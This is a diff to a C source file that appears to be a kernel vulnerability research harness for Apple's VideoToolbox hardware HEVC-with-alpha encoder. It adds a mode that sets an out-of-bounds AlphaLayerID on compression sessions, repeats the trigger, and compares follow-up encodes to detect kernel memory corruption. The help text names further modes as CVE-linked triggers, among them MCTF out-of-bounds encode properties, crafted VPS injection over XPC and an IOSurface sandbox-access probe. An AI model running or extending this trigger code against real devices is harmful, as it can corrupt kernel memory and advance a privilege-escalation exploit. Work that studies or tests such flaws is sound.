@@ -5822,6 +5822,316 @@ vps_props_done:
         rlog("overflow sHEVC_VPS extension arrays during sAddClient.\n");
         rlog("Compare which properties report set=0 (accepted) above.\n");
 
+    } else if (strcmp(mode, "vps_corrupt_detect") == 0) {
+        /*
+         * vps_corrupt_detect — Detect if OOB AlphaLayerID corrupts kernel state
+         *
+         * Test: encode with OOB value, then encode with safe value on new session.
+         * If second encode is affected, proves kernel memory was corrupted.
+         */
+        int oob_val = (argc > 2) ? atoi(argv[2]) : 64;
+        int rounds = (argc > 3) ? atoi(argv[3]) : 3;
+        int w = 192, h = 192;
+
+        rlog("=== VPS_CORRUPT_DETECT: kernel OOB write detection ===\n");
+        rlog("OOB AlphaLayerID=%d, rounds=%d\n\n", oob_val, rounds);
+
+        /* Phase A: Control — safe encode WITHOUT prior OOB */
+        rlog("--- Phase A: Control (no prior OOB) ---\n");
+        for (int r = 0; r < rounds; r++) {
+            VTCompressionSessionRef s = NULL;
+            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(enc_spec,
+                CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            OSStatus st = VTCompressionSessionCreate(NULL, w, h,
+                (CMVideoCodecType)0x6D757861, enc_spec, NULL, NULL,
+                encode_cb, NULL, &s);
+            CFRelease(enc_spec);
+            if (st != noErr || !s) { rlog("  ctrl[%d]: create fail %d\n", r, (int)st); continue; }
+
+            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+            float aq = 0.75f;
+            CFNumberRef aqn = CFNumberCreate(NULL, kCFNumberFloat32Type, &aq);
+            VTSessionSetProperty(s, CFSTR("TargetQualityForAlpha"), aqn);
+            CFRelease(aqn);
+            VTSessionSetProperty(s, CFSTR("AlphaChannelMode"), CFSTR("PremultipliedAlpha"));
+            int safe_aid = 1;
+            CFNumberRef aidn = CFNumberCreate(NULL, kCFNumberIntType, &safe_aid);
+            VTSessionSetProperty(s, CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn);
+            CFRelease(aidn);
+
+            st = VTCompressionSessionPrepareToEncodeFrames(s);
+            if (st != noErr) { rlog("  ctrl[%d]: prep fail %d\n", r, (int)st); VTCompressionSessionInvalidate(s); CFRelease(s); continue; }
+
+            g_encode_done = 0; g_cb_status = -999;
+            g_last_pset_count = 0; g_last_pset_total_bytes = 0;
+
+            CVPixelBufferRef pb = NULL;
+            CFMutableDictionaryRef pbdict = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(pbdict, kCVPixelBufferIOSurfacePropertiesKey,
+                CFDictionaryCreate(NULL, NULL, NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks));
+            CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, pbdict, &pb);
+            CFRelease(pbdict);
+            if (pb) {
+                CVPixelBufferLockBaseAddress(pb, 0);
+                void *base = CVPixelBufferGetBaseAddress(pb);
+                if (base) memset(base, 0x80, CVPixelBufferGetDataSize(pb));
+                CVPixelBufferUnlockBaseAddress(pb, 0);
+                CMTime pts = CMTimeMake(r, 30);
+                CMTime dur = CMTimeMake(1, 30);
+                VTCompressionSessionEncodeFrame(s, pb, pts, dur, NULL, NULL, NULL);
+                for (int ww = 0; ww < 500 && !g_encode_done; ww++) usleep(10000);
+                rlog("  ctrl[%d]: enc=%d psets=%zu bytes=%zu\n",
+                    r, (int)g_cb_status, g_last_pset_count, g_last_pset_total_bytes);
+                VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+                CVPixelBufferRelease(pb);
+            }
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+        }
+
+        /* Phase B: OOB trigger + immediate safe encode */
+        rlog("\n--- Phase B: OOB trigger then safe encode ---\n");
+        for (int r = 0; r < rounds; r++) {
+            /* B1: OOB session */
+            rlog("  round[%d] OOB(aid=%d): ", r, oob_val);
+            {
+                VTCompressionSessionRef s = NULL;
+                CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                CFDictionarySetValue(enc_spec,
+                    CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+                OSStatus st = VTCompressionSessionCreate(NULL, w, h,
+                    (CMVideoCodecType)0x6D757861, enc_spec, NULL, NULL,
+                    encode_cb, NULL, &s);
+                CFRelease(enc_spec);
+                if (st != noErr || !s) { rlog("create fail %d\n", (int)st); continue; }
+
+                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+                float aq = 0.75f;
+                CFNumberRef aqn = CFNumberCreate(NULL, kCFNumberFloat32Type, &aq);
+                VTSessionSetProperty(s, CFSTR("TargetQualityForAlpha"), aqn);
+                CFRelease(aqn);
+                VTSessionSetProperty(s, CFSTR("AlphaChannelMode"), CFSTR("PremultipliedAlpha"));
+                CFNumberRef aidn = CFNumberCreate(NULL, kCFNumberIntType, &oob_val);
+                VTSessionSetProperty(s, CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn);
+                CFRelease(aidn);
+
+                st = VTCompressionSessionPrepareToEncodeFrames(s);
+                rlog("prep=%d ", (int)st);
+
+                if (st == noErr) {
+                    g_encode_done = 0; g_cb_status = -999;
+                    g_last_pset_count = 0; g_last_pset_total_bytes = 0;
+                    CVPixelBufferRef pb = NULL;
+                    CFMutableDictionaryRef pbdict = CFDictionaryCreateMutable(NULL, 0,
+                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                    CFDictionarySetValue(pbdict, kCVPixelBufferIOSurfacePropertiesKey,
+                        CFDictionaryCreate(NULL, NULL, NULL, 0,
+                            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks));
+                    CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, pbdict, &pb);
+                    CFRelease(pbdict);
+                    if (pb) {
+                        CVPixelBufferLockBaseAddress(pb, 0);
+                        void *base = CVPixelBufferGetBaseAddress(pb);
+                        if (base) memset(base, 0x80, CVPixelBufferGetDataSize(pb));
+                        CVPixelBufferUnlockBaseAddress(pb, 0);
+                        CMTime pts = CMTimeMake(0, 30);
+                        CMTime dur = CMTimeMake(1, 30);
+                        VTCompressionSessionEncodeFrame(s, pb, pts, dur, NULL, NULL, NULL);
+                        for (int ww = 0; ww < 500 && !g_encode_done; ww++) usleep(10000);
+                        rlog("enc=%d psets=%zu\n", (int)g_cb_status, g_last_pset_count);
+                        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+                        CVPixelBufferRelease(pb);
+                    }
+                } else {
+                    rlog("\n");
+                }
+                VTCompressionSessionInvalidate(s);
+                CFRelease(s);
+            }
+
+            /* B2: Immediate safe session after OOB */
+            rlog("  round[%d] SAFE(aid=1): ", r);
+            {
+                VTCompressionSessionRef s = NULL;
+                CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                CFDictionarySetValue(enc_spec,
+                    CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+                OSStatus st = VTCompressionSessionCreate(NULL, w, h,
+                    (CMVideoCodecType)0x6D757861, enc_spec, NULL, NULL,
+                    encode_cb, NULL, &s);
+                CFRelease(enc_spec);
+                if (st != noErr || !s) { rlog("create fail %d\n", (int)st); continue; }
+
+                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+                float aq = 0.75f;
+                CFNumberRef aqn = CFNumberCreate(NULL, kCFNumberFloat32Type, &aq);
+                VTSessionSetProperty(s, CFSTR("TargetQualityForAlpha"), aqn);
+                CFRelease(aqn);
+                VTSessionSetProperty(s, CFSTR("AlphaChannelMode"), CFSTR("PremultipliedAlpha"));
+                int safe_aid = 1;
+                CFNumberRef aidn = CFNumberCreate(NULL, kCFNumberIntType, &safe_aid);
+                VTSessionSetProperty(s, CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn);
+                CFRelease(aidn);
+
+                st = VTCompressionSessionPrepareToEncodeFrames(s);
+                rlog("prep=%d ", (int)st);
+
+                if (st == noErr) {
+                    g_encode_done = 0; g_cb_status = -999;
+                    g_last_pset_count = 0; g_last_pset_total_bytes = 0;
+                    CVPixelBufferRef pb = NULL;
+                    CFMutableDictionaryRef pbdict = CFDictionaryCreateMutable(NULL, 0,
+                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                    CFDictionarySetValue(pbdict, kCVPixelBufferIOSurfacePropertiesKey,
+                        CFDictionaryCreate(NULL, NULL, NULL, 0,
+                            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks));
+                    CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, pbdict, &pb);
+                    CFRelease(pbdict);
+                    if (pb) {
+                        CVPixelBufferLockBaseAddress(pb, 0);
+                        void *base = CVPixelBufferGetBaseAddress(pb);
+                        if (base) memset(base, 0x80, CVPixelBufferGetDataSize(pb));
+                        CVPixelBufferUnlockBaseAddress(pb, 0);
+                        CMTime pts = CMTimeMake(0, 30);
+                        CMTime dur = CMTimeMake(1, 30);
+                        VTCompressionSessionEncodeFrame(s, pb, pts, dur, NULL, NULL, NULL);
+                        for (int ww = 0; ww < 500 && !g_encode_done; ww++) usleep(10000);
+                        rlog("enc=%d psets=%zu bytes=%zu\n",
+                            (int)g_cb_status, g_last_pset_count, g_last_pset_total_bytes);
+                        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+                        CVPixelBufferRelease(pb);
+                    }
+                } else {
+                    rlog("\n");
+                }
+                VTCompressionSessionInvalidate(s);
+                CFRelease(s);
+            }
+        }
+
+        /* Phase C: Multiple OOB encodes then safe — cumulative corruption */
+        rlog("\n--- Phase C: 5x OOB then safe ---\n");
+        for (int oob_round = 0; oob_round < 5; oob_round++) {
+            VTCompressionSessionRef s = NULL;
+            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(enc_spec,
+                CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            OSStatus st = VTCompressionSessionCreate(NULL, w, h,
+                (CMVideoCodecType)0x6D757861, enc_spec, NULL, NULL,
+                encode_cb, NULL, &s);
+            CFRelease(enc_spec);
+            if (st != noErr || !s) { rlog("  oob[%d]: create fail %d\n", oob_round, (int)st); continue; }
+
+            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+            float aq = 0.75f;
+            CFNumberRef aqn = CFNumberCreate(NULL, kCFNumberFloat32Type, &aq);
+            VTSessionSetProperty(s, CFSTR("TargetQualityForAlpha"), aqn);
+            CFRelease(aqn);
+            VTSessionSetProperty(s, CFSTR("AlphaChannelMode"), CFSTR("PremultipliedAlpha"));
+            CFNumberRef aidn = CFNumberCreate(NULL, kCFNumberIntType, &oob_val);
+            VTSessionSetProperty(s, CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn);
+            CFRelease(aidn);
+
+            st = VTCompressionSessionPrepareToEncodeFrames(s);
+            if (st == noErr) {
+                g_encode_done = 0; g_cb_status = -999;
+                g_last_pset_count = 0;
+                CVPixelBufferRef pb = NULL;
+                CFMutableDictionaryRef pbdict = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                CFDictionarySetValue(pbdict, kCVPixelBufferIOSurfacePropertiesKey,
+                    CFDictionaryCreate(NULL, NULL, NULL, 0,
+                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks));
+                CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, pbdict, &pb);
+                CFRelease(pbdict);
+                if (pb) {
+                    CVPixelBufferLockBaseAddress(pb, 0);
+                    void *base = CVPixelBufferGetBaseAddress(pb);
+                    if (base) memset(base, 0x80, CVPixelBufferGetDataSize(pb));
+                    CVPixelBufferUnlockBaseAddress(pb, 0);
+                    CMTime pts = CMTimeMake(oob_round, 30);
+                    CMTime dur = CMTimeMake(1, 30);
+                    VTCompressionSessionEncodeFrame(s, pb, pts, dur, NULL, NULL, NULL);
+                    for (int ww = 0; ww < 500 && !g_encode_done; ww++) usleep(10000);
+                    rlog("  oob[%d]: enc=%d psets=%zu\n", oob_round, (int)g_cb_status, g_last_pset_count);
+                    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+                    CVPixelBufferRelease(pb);
+                }
+            } else {
+                rlog("  oob[%d]: prep fail %d\n", oob_round, (int)st);
+            }
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+        }
+        /* Now safe encode */
+        {
+            VTCompressionSessionRef s = NULL;
+            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(enc_spec,
+                CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            OSStatus st = VTCompressionSessionCreate(NULL, w, h,
+                (CMVideoCodecType)0x6D757861, enc_spec, NULL, NULL,
+                encode_cb, NULL, &s);
+            CFRelease(enc_spec);
+            if (st != noErr || !s) { rlog("  safe after 5x: create fail %d\n", (int)st); goto vps_cd_done; }
+
+            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+            float aq = 0.75f;
+            CFNumberRef aqn = CFNumberCreate(NULL, kCFNumberFloat32Type, &aq);
+            VTSessionSetProperty(s, CFSTR("TargetQualityForAlpha"), aqn);
+            CFRelease(aqn);
+            VTSessionSetProperty(s, CFSTR("AlphaChannelMode"), CFSTR("PremultipliedAlpha"));
+            int safe_aid = 1;
+            CFNumberRef aidn = CFNumberCreate(NULL, kCFNumberIntType, &safe_aid);
+            VTSessionSetProperty(s, CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn);
+            CFRelease(aidn);
+
+            st = VTCompressionSessionPrepareToEncodeFrames(s);
+            if (st == noErr) {
+                g_encode_done = 0; g_cb_status = -999;
+                g_last_pset_count = 0; g_last_pset_total_bytes = 0;
+                CVPixelBufferRef pb = NULL;
+                CFMutableDictionaryRef pbdict = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                CFDictionarySetValue(pbdict, kCVPixelBufferIOSurfacePropertiesKey,
+                    CFDictionaryCreate(NULL, NULL, NULL, 0,
+                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks));
+                CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, pbdict, &pb);
+                CFRelease(pbdict);
+                if (pb) {
+                    CVPixelBufferLockBaseAddress(pb, 0);
+                    void *base = CVPixelBufferGetBaseAddress(pb);
+                    if (base) memset(base, 0x80, CVPixelBufferGetDataSize(pb));
+                    CVPixelBufferUnlockBaseAddress(pb, 0);
+                    CMTime pts = CMTimeMake(0, 30);
+                    CMTime dur = CMTimeMake(1, 30);
+                    VTCompressionSessionEncodeFrame(s, pb, pts, dur, NULL, NULL, NULL);
+                    for (int ww = 0; ww < 500 && !g_encode_done; ww++) usleep(10000);
+                    rlog("  safe after 5x: enc=%d psets=%zu bytes=%zu\n",
+                        (int)g_cb_status, g_last_pset_count, g_last_pset_total_bytes);
+                    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+                    CVPixelBufferRelease(pb);
+                }
+            } else {
+                rlog("  safe after 5x: prep fail %d\n", (int)st);
+            }
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+        }
+
+vps_cd_done:
+        rlog("\n=== VPS_CORRUPT_DETECT complete ===\n");
+        rlog("Compare Phase A (control) vs Phase B (after OOB) vs Phase C (after 5x OOB).\n");
+        rlog("If safe encodes after OOB differ from control → kernel state corrupted.\n");
+
     } else if (strcmp(mode, "mctf_oob") == 0) {
         /*
          * mctf_oob — CVE-2026-112468/112469: MCTF and LRME OOB via encode properties
@@ -6556,6 +6866,7 @@ vps_props_done:
         rlog("  vps_verify         -- Verify if crafted VPS reaches kernel (compare output)\n");
         rlog("  xpc_vps [phase]    -- XPC VPS field manipulation + crafted format injection\n");
         rlog("  vps_props [phase] [unsafe] -- KEY: CVE-114025 VPS property trigger (5 phases)\n");
+        rlog("  vps_corrupt_detect [aid] [rounds] -- Detect OOB VPS write corruption\n");
         rlog("  mctf_oob [max]     -- KEY: CVE-112468/112469 MCTF OOB via encode properties\n");
         rlog("  iosurface_probe    -- KEY: IOSurface sandbox access + CVE-112477 reachability\n");
         rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
